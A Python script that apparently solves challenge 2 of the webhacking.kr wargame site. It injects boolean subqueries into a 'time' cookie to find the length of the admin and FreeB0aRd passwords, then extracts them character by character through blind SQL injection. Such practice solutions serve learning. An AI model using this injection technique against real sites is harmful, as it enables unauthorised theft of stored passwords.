import requests, time

url = 'http://webhacking.kr/challenge/web/web-02/'
cookies = {
	'PHPSESSID': '',
	'time': None
}

password = {
	'admin': {
		'value': '',
		'length': 0
	},
	'FreeB0aRd': {
		'value': '',
		'length': 0
	}
}

cookies['PHPSESSID'] = input('Enter your PHPSESSID => ')

for key, value in password.items():
	table = key
	# Guess the length of password.
	while True:
		cookies['time'] = '1543122851 and (select length(password) from %s)=%d' % (table, password[table]['length'])

		res = requests.get(url, cookies=cookies)
		if '<!--2070-01-01 09:00:01-->' in res.text:
			print('%s has %d characters password.' % (table, password[table]['length']))
			break
		password[table]['length'] += 1
		time.sleep(0.05)
		print(password[table]['length'])
	
	# Linear search the password.
	for i in range(0, password[table]['length']+1):
		for j in range(ord('!'), ord('~')+1):
			cookies['time'] = '1543122851 and (select ascii(substring(password, %d, 1)) from %s)=%d' % (i, table, j)
			res = requests.get(url, cookies=cookies)
			if '<!--2070-01-01 09:00:01-->' in res.text:
				password[table]['value'] += chr(j)
				print('Sniff... Sniff...', password[table]['value'])
				break
	
	print(table, password[table]['value'])
